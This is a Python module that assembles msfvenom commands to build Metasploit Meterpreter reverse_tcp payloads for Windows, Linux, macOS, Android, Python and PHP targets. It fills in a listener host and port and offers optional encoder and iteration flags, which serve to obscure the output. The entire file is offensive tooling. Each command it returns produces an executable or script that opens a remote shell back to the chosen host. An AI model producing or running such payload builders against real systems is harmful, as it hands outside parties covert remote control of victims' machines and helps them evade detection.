"""Command recipe builder for msfvenom reference commands."""

from dataclasses import dataclass
from typing import Optional


@dataclass
class PayloadRecipe:
    platform: str
    architecture: str
    lhost: str
    lport: int
    format: str
    output_path: str
    encoder: Optional[str]
    iterations: Optional[int]
    command: str


PLATFORM_PAYLOADS = {
    "windows": {
        "x86": "windows/meterpreter/reverse_tcp",
        "x64": "windows/x64/meterpreter/reverse_tcp",
    },
    "linux": {
        "x86": "linux/x86/meterpreter/reverse_tcp",
        "x64": "linux/x64/meterpreter/reverse_tcp",
    },
    "macos": {
        "x64": "osx/x64/meterpreter/reverse_tcp",
        "arm64": "osx/arm64/meterpreter/reverse_tcp",
    },
    "android": {
        "dalvik": "android/meterpreter/reverse_tcp",
    },
    "python": {
        "python": "python/meterpreter/reverse_tcp",
    },
    "php": {
        "php": "php/meterpreter/reverse_tcp",
    },
}

PLATFORM_FORMATS = {
    "windows": "exe",
    "linux": "elf",
    "macos": "macho",
    "android": "apk",
    "python": "raw",
    "php": "raw",
}


def build_recipe(
    platform: str,
    arch: str,
    lhost: str,
    lport: int,
    output_path: str = "/tmp/payload",
    encoder: Optional[str] = None,
    iterations: Optional[int] = None,
) -> PayloadRecipe:
    platform_lower = platform.lower()
    arch_lower = arch.lower()

    payload_key = PLATFORM_PAYLOADS.get(platform_lower, {})
    payload = payload_key.get(arch_lower, f"{platform_lower}/{arch_lower}/meterpreter/reverse_tcp")

    fmt = PLATFORM_FORMATS.get(platform_lower, "raw")
    if fmt == "raw":
        format_flag = "-f raw"
        output_file = f"{output_path}.py" if platform_lower == "python" else f"{output_path}.{fmt}"
    else:
        format_flag = f"-f {fmt}"
        output_file = f"{output_path}.{fmt}"

    cmd_parts = [
        "msfvenom",
        "-p", payload,
        f"LHOST={lhost}",
        f"LPORT={lport}",
        format_flag,
        "-o", output_file,
    ]

    if encoder:
        cmd_parts.extend(["-e", encoder])
    if iterations:
        cmd_parts.extend(["-i", str(iterations)])

    command = " ".join(cmd_parts)

    return PayloadRecipe(
        platform=platform_lower,
        architecture=arch_lower,
        lhost=lhost,
        lport=lport,
        format=fmt,
        output_path=output_file,
        encoder=encoder,
        iterations=iterations,
        command=command,
    )


def get_available_platforms() -> list[str]:
    return list(PLATFORM_PAYLOADS.keys())


def get_available_arches(platform: str) -> list[str]:
    platform_lower = platform.lower()
    if platform_lower in PLATFORM_PAYLOADS:
        return list(PLATFORM_PAYLOADS[platform_lower].keys())
    return []
